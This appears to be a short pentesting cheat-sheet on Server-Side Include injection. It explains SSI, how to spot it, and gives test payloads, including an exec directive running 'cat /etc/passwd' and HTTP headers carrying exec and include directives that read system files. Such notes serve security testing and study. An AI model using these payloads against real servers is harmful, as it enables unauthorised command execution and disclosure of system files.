# SSI (Server Side include)
---
Web servers usually give developers the ability to add small pieces of dynamic code inside static HTML pages, without having to deal with full-fledged server-side or client-side languages.
Server-Side Includes are directives that the web server parses before serving the page to the user. They represent an alternative to writing CGI programs or embedding code using server-side scripting languages
Common SSI implementations provide directives **(commands)** to include external files, to set and print web server CGI environment variables, or to execute external **CGI scripts or system commands**.

SSI can lead to a *Remote Command Execution (RCE),* however most webservers have the `exec` directive disabled by default.

## FingerPrinting
You can verify that SSI directives are enabled is by checking for pages with the `.shtml` extension, which is associated with SSI directives. The use of the `.shtml` extension is not mandatory, so not having found any `.shtml` files doesnâ€™t necessarily mean that the target is not vulnerable to SSI injection attacks.
- Possible input vectors may also include headers and cookies

## Testing
#### Include directive
```txt
<!--#include virtual="/etc/passwd"-->
```
#### echo directive
```txt
<!--#echo var="SHELL"-->
```
#### exec directive
```txt
<!--#exec cmd="cat /etc/passwd"-->
```
The SSI directives can also be injected in the HTTP headers, if the web application is using that data to build a dynamically generated page:
```txt
GET / HTTP/1.1
Host: www.example.com
Referer: <!--#exec cmd="/bin/ps ax"-->
User-Agent: <!--#include virtual="/proc/version"-->
```
